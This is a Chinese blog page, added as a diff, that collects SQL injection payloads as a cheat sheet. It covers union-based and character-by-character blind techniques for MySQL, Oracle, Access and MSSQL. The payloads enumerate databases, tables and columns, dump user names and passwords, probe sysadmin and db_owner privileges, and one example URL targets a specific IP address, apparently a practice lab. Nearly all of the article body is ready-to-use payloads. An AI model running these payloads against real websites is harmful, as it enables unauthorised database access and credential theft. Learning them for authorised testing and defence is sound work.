@@ -1,0 +1,299 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql注入-联合查询总结 | Mssn Harvey</title><meta name="keywords" content="sql注入"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="联合查询注入利用的条件：页面上有显示位 联合注入的过程： 1234567891011121314151、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据  数据库判断：1.用@@datadir查看数据库安装目录，能否判断出2.通过各个数据库特有的数据表来判断: 1234mssql:and (select c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入-联合查询总结">
+<meta property="og:url" content="http://example.com/2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Mssn Harvey">
+<meta property="og:description" content="联合查询注入利用的条件：页面上有显示位 联合注入的过程： 1234567891011121314151、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据  数据库判断：1.用@@datadir查看数据库安装目录，能否判断出2.通过各个数据库特有的数据表来判断: 1234mssql:and (select c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(51).jpg">
+<meta property="article:published_time" content="2020-09-23T05:14:20.000Z">
+<meta property="article:modified_time" content="2021-03-21T07:41:53.681Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(51).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-21 15:41:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(51).jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入-联合查询总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-23T05:14:20.000Z" title="发表于 2020-09-23 13:14:20">2020-09-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-21T07:41:53.681Z" title="更新于 2021-03-21 15:41:53">2021-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Gamma%E5%AE%9E%E9%AA%8C%E5%AE%A4/">Gamma实验室</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>联合查询注入利用的条件：页面上有显示位</p>
+<p>联合注入的过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、判断注入点</span><br><span class="line"></span><br><span class="line">2、判断是整型还是字符型</span><br><span class="line"></span><br><span class="line">3、判断查询列数</span><br><span class="line"></span><br><span class="line">4、判断显示位</span><br><span class="line"></span><br><span class="line">5、获取所有数据库名</span><br><span class="line"></span><br><span class="line">6、获取数据库所有表名</span><br><span class="line"></span><br><span class="line">7、获取字段名</span><br><span class="line"></span><br><span class="line">8、获取字段中的数据</span><br></pre></td></tr></table></figure>
+
+<p>数据库判断：<br>1.用@@datadir查看数据库安装目录，能否判断出<br>2.通过各个数据库特有的数据表来判断:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mssql:and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">Accese:and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line">mysql:and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1 </span><br><span class="line">oracle:and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><strong>终极法宝 ：报错信息！！！！！！！！！！</strong></p>
+<h3 id="mysql注入："><a href="#mysql注入：" class="headerlink" title="mysql注入："></a>mysql注入：</h3><p>注入判断：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">And 1&#x3D;1</span><br><span class="line">ord(0x1)</span><br><span class="line">&gt; </span><br><span class="line">\\</span><br><span class="line">&#x2F;</span><br><span class="line">#</span><br><span class="line">--+-</span><br><span class="line">^1^0</span><br></pre></td></tr></table></figure>
+
+<p>字段数判断：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Order by 3 --</span><br></pre></td></tr></table></figure>
+
+<p>获取所有数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+
+<p>获取表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select table_name from information_schema.tables where table_schema&#x3D;database() --</span><br></pre></td></tr></table></figure>
+
+<p>获取字段名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select column_name from information_schema.columns where table_schema&#x3D;table_name -</span><br></pre></td></tr></table></figure>
+
+<p>查询数据:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(concat_ws(char(32,58,32),first_name,password))  from users --</span><br></pre></td></tr></table></figure>
+
+<p>内置函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拆解数据库名：database() 用户名：user() 版本：version() 或 @@version</span><br><span class="line">数据库路径：@@datadir</span><br></pre></td></tr></table></figure>
+
+<p><strong>mysql</strong>通过information_schema这个表查询相应的数据库名，表名，字段名。</p>
+<h3 id="oracle注入："><a href="#oracle注入：" class="headerlink" title="oracle注入："></a>oracle注入：</h3><p>获取数据库所有用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM all_users;</span><br><span class="line">SELECT name FROM sys.user$; -- 需要高权限</span><br></pre></td></tr></table></figure>
+
+<p>获取当前数据库用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;</span><br></pre></td></tr></table></figure>
+
+<p>字段数判断：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 3 --</span><br><span class="line">and 1&#x3D;2 union select null,null,null from dual--</span><br></pre></td></tr></table></figure>
+
+<p>判断子段的数据类型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select &#39;null&#39;,null,null from dual--  &#x2F;&#x2F;返回正常，则第一个字段是字符型，返回错误，为字符型，返回错误，为字符型</span><br></pre></td></tr></table></figure>
+
+<p>数据库信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;探测数据库版本信息</span><br></pre></td></tr></table></figure>
+
+<p>查询表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual--  &#x2F;&#x2F;查询第一个表名</span><br><span class="line">and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;&#39;STUDENT&#39;),null from dual--  &#x2F;&#x2F;第二个表名</span><br></pre></td></tr></table></figure>
+
+<p>查询字段名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1),null from dual-- &#x2F;&#x2F;查看第一个字段名</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[第一个字段名]&#39;),null from dual-- &#x2F;&#x2F;查看第二个字段名</span><br><span class="line">and 1&#x3D;2 union select null,(select column_name from user_tab_columns where table_name&#x3D;&#39;[表名]&#39; and rownum&#x3D;1 and column_name&lt;&gt;&#39;[第一个字段名]&#39; and column_name&lt;&gt;&#39;[第二个字段名名]&#39;),null from dual-- &#x2F;&#x2F;查看第三个字段名</span><br></pre></td></tr></table></figure>
+
+<p>查数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2 union select id,name,pass from student where id&#x3D;1--  &#x2F;&#x2F;查看数据</span><br><span class="line"></span><br><span class="line">wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</span><br></pre></td></tr></table></figure>
+
+<p>如果字符集不匹配：<br>则需要进行字符集转换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast(&#39;&#39; as nvarchar2(10))</span><br></pre></td></tr></table></figure>
+
+<p>栗子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;-1%20union%20all%20select%20NULL,NULL,cast((select%20table_name%20from%20user_tables%20where%20rownum&#x3D;1)%20as%20nvarchar2(10)),1%20from%20dual--%20-</span><br></pre></td></tr></table></figure>
+
+<h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>1.Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。</p>
+<p>2.Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;=0&lt;=1”) </p>
+<p>例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;&#x3D; 1 ) WHERE RN &gt;&#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3126305494.png"></p>
+<p>3.Oracle的单行注释符号是–，多行注释符号/**/</p>
+<h3 id="Acess数据注入："><a href="#Acess数据注入：" class="headerlink" title="Acess数据注入："></a>Acess数据注入：</h3><p>判断字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1 --+-</span><br></pre></td></tr></table></figure>
+
+<p>判断表：</p>
+<p>联合查询表，回显正常即为表存在，反之为不存在。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Union select * from 表名   或  表名还可以使用这种方法来猜表名，</span><br><span class="line"></span><br><span class="line">and 0&lt;&gt;(select count(*) from 表名) </span><br></pre></td></tr></table></figure>
+
+<p>列名也只能靠猜，如果猜不到就只能使用偏移注入来碰运气了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and exists (select admin from admin)</span><br><span class="line"></span><br><span class="line">and exists (select count(列名) from 表名)</span><br></pre></td></tr></table></figure>
+
+<p>爆字段内容：</p>
+<p>爆字段内容要分两步，先猜长度，再猜内容猜长度。and (select len(admin) from admin)=5，如果正确则回显正常。</p>
+<p>猜内容，一个一个字段的猜，和盲注一样的道理。and (select asc(mid(admin,1,1)) from admin)&gt;95,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(列名,列数N,1)) from 表名) &gt; x</span><br><span class="line"></span><br><span class="line">top后的数字为该列的第N行，x为ASCII码，列数N就是在这一列中的第几个数字</span><br><span class="line"></span><br><span class="line">asc()仍然还是转换为ascii码的函数，mid(admin,1,1)则为截取admin字段内容的第一个字符的一个字符，也就为第一个字符。</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSSQL注入："><a href="#MSSQL注入：" class="headerlink" title="MSSQL注入："></a>MSSQL注入：</h3><p>查询当前的用户数据信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 having 1&#x3D;1--+-</span><br></pre></td></tr></table></figure>
+
+<p>猜表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and exists(select * from tablename)</span><br><span class="line">?id&#x3D;1 and (Select Count(*) from [表名])&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>猜字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (Select Count(字段名) from 表名)&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>爆当前表中的列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 group by admin.username having 1&#x3D;1–-+-</span><br></pre></td></tr></table></figure>
+
+<p>猜字段中记录长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 len(字段名) from 表名)&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>猜字段中的ascii值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 access</span><br><span class="line">?id&#x3D;1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0</span><br></pre></td></tr></table></figure>
+
+<p>查数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT name FROM master..syscolumns WHERE id &#x3D; (SELECT id FROM master..syscolumns WHERE name &#x3D; &#39;tablename&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>测试权限结构（mssql）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</span><br><span class="line">· ?id&#x3D;1 and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–</span><br></pre></td></tr></table></figure>
+
+<p>mssql内置函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">· ?id&#x3D;1 and (select @@version)&gt;0　　　获得Windows的版本号</span><br><span class="line">· ?id&#x3D;1 and user_name()&#x3D;’dbo’　　　　 判断当前系统的连接用户是不是sa</span><br><span class="line">· ?id&#x3D;1 and (select user_name())&gt;0　　爆当前系统的连接用户</span><br><span class="line">· ?id&#x3D;1 and (select db_name())&gt;0　　　得到当前连接的数据库</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/">http://example.com/2020/09/23/sql%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(51).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/27/VRRP%E5%A4%9A%E7%BD%91%E5%85%B3%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(75).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VRRP多网关实现负载均衡</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/22/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD-IP%E4%B8%9A%E5%8A%A1%E4%B9%8BDNS/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(63).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网络工程师必备技能-IP业务之DNS</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar 